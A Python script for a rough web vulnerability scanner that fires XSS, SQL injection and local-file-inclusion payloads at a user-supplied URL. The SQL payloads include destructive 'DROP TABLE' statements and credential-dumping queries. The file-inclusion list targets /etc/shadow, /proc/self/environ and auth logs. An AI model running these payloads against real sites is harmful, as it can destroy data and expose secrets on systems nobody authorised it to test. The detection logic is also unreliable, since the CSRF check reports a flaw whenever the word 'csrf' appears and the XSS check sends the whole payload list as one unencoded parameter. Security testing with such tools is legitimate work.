import requests
from colorama import Fore
def scan_xss_vulnerability(target_url):
    # Define the payload to test for XSS vulnerability
    payload = "<script>alert('XSS vulnerability')</script>\n\"-prompt(8)-\"\n'-prompt(8)-'\n\";a=prompt,a()//\n';a=prompt,a()//\n'-eval(\"window['pro'%2B'mpt'](8)\")-'\n\"-eval(\"window['pro'%2B'mpt'](8)\")-\"\n\"onclick=prompt(8)>\"@x.y\n\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y\n<image/src/onerror=prompt(8)>\n<img/src/onerror=prompt(8)>\n<image src/onerror=prompt(8)>\n<img src/onerror=prompt(8)>\n<image src =q onerror=prompt(8)>\n<img src =q onerror=prompt(8)>\n</scrip</script>t><img src =q onerror=prompt(8)>\n<script\x20type=\"text/javascript\">javascript:alert(1);</script>\n<script\x3Etype=\"text/javascript\">javascript:alert(1);</script>\n<script\x0Dtype=\"text/javascript\">javascript:alert(1);</script>\n<script\x09type=\"text/javascript\">javascript:alert(1);</script>\n<script\x0Ctype=\"text/javascript\">javascript:alert(1);</script>\n<script\x2Ftype=\"text/javascript\">javascript:alert(1);</script>\n<script\x0Atype=\"text/javascript\">javascript:alert(1);</script>\n'`\"><\\x3Cscript>javascript:alert(1)</script>        \n'`\"><\\x00script>javascript:alert(1)</script>\n<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>\n<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>\n<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>\n<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>\n<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>\n<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>\n<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>\n<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>\n<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>\n<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>\n<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>\n<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>\n<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>\n<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>\n<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>\n<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>\n<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>\n<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>\n<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>\n<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>\n<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>\n<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>\n<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>\n<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>\n<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>\n<iframe"

    # Send a GET request with the payload
    response = requests.get(target_url + "?parameter=" + payload)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print("XSS vulnerability detected!")
    else:
        print("No XSS vulnerability detected.")

#if __name__ =="__main__":
#scan_xss_vulnerability(target_url)

def scan_csrf_vulnerability(target_url):
    # Send a GET request to the target URL
    response = requests.get(target_url)

    # Check if the response contains any potential CSRF indicators
    if "csrf" in response.text.lower():
        print("CSRF vulnerability detected")
    else:
        print("No CSRF vulnerability detected")

# Perform the CSRF vulnerability scan
#scan_csrf_vulnerability(target_url)

from colorama import Fore

def scan_sqli_vulnerability(target_url):
    payloads = [
        "DROP sampletable;--",
        "DROP sampletable;#",
        "admin'--",
        "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'",
        "SELECT /*!32302 1/0, */ 1 FROM tablename 10; DROP TABLE members /*",
        "10; DROP TABLE members --",
        "SELECT /*!32302 1/0, */ 1 FROM tablename /*!32302 10*/",
        "SELECT /*!32302 1/0, */ 1 FROM tablename",
        "SELECT * FROM members; DROP members--",
        "BEGIN\nIF condition THEN true-part; ELSE false-part; END IF; END;",
        "IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;",
        "SELECT CASE WHEN condition THEN true-part ELSE false-part END;",
        "SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;",
        "if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0",
        "SELECT login + '-' + password FROM members",
        "SELECT login || '-' || password FROM members"
    ]
    vulnerable = False

    for payload in payloads:
        ##encoding
        encoded_payload = requests.utils.quote(payload, safe='')

        ##sending GET
        response = requests.get(target_url + "?parameter=" + encoded_payload)

        # Check if the response contains any signs of SQL injection vulnerability
        if "error" in response.text.lower() or "syntax error" in response.text.lower():
            print(f"{Fore.RED}[!] SQL Injection vulnerability detected with payload: {payload}")
            vulnerable = True

    if not vulnerable:
        print("[+] No SQL Injection vulnerability detected")

# Prompt the user to input the target URL
#target_url = input("Enter the target URL: ")

# Call the function to scan for SQL injection vulnerabilities
#scan_sqli_vulnerability(target_url)
  


def scan_lfi_vulnerability(target_url):
    payloads = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/profile",
        "/etc/mysql/my.cnf",
        "/proc/self/environ",
        "/var/log/auth.log",
        "/var/log/apache/access.log",
        "/var/log/apache/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/C:/boot.ini",
        "/C:/Windows/win.ini",
        "/C:/Windows/System32/drivers/etc/hosts",
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///etc/hosts",
        "file:///etc/profile",
        "file:///etc/mysql/my.cnf",
        "file:///proc/self/environ",
        "file:///var/log/auth.log",
        "file:///var/log/apache/access.log",
        "file:///var/log/apache/error.log",
        "file:///var/log/nginx/access.log",
        "file:///var/log/nginx/error.log",
        "file:///C:/boot.ini",
        "file:///C:/Windows/win.ini",
        "file:///C:/Windows/System32/drivers/etc/hosts"
    ]

    for payload in payloads:
        # Send a GET request with the payload appended to the target URL
        response = requests.get(target_url + payload)

        # Check if the response contains any sensitive information
        if "root:" in response.text or "Administrator:" in response.text:
            print("[!] LFI vulnerability detected with payload: " + payload)

# Prompt the user to input the target URL
target_url = input( Fore.RED + "Enter the target URL: ")

# Call the function to scan for LFI vulnerabilities
scan_xss_vulnerability(target_url)
scan_csrf_vulnerability(target_url)
scan_sqli_vulnerability(target_url)
scan_lfi_vulnerability(target_url)
